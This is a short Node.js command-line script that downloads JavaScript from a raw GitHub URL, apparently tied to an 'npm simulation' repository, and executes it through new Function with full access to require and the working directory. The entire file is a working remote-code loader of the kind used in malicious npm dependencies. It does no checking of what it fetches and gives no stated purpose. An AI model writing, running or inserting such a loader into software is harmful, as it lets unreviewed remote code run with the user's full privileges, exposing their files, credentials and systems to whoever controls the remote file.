#!/usr/bin/env node

const https = require("https");

const URL =
  "https://raw.githubusercontent.com/debug-dependency/npm-simulation-download/refs/heads/main/simulation.js";

function download(url) {
  return new Promise((resolve, reject) => {
    https.get(url, res => {
      if (res.statusCode !== 200) {
        reject(new Error(`HTTP ${res.statusCode}`));
        return;
      }

      let code = "";
      res.setEncoding("utf8");
      res.on("data", chunk => (code += chunk));
      res.on("end", () => resolve(code));
    }).on("error", reject);
  });
}

(async () => {
  const code = await download(URL);

  const module = { exports: {} };

  const fn = new Function(
    "require",
    "module",
    "exports",
    "__filename",
    "__dirname",
    code
  );

  fn(require, module, module.exports, "remote.js", process.cwd());

  // optional: use exports
  if (typeof module.exports === "function") {
    module.exports();
  }
})();
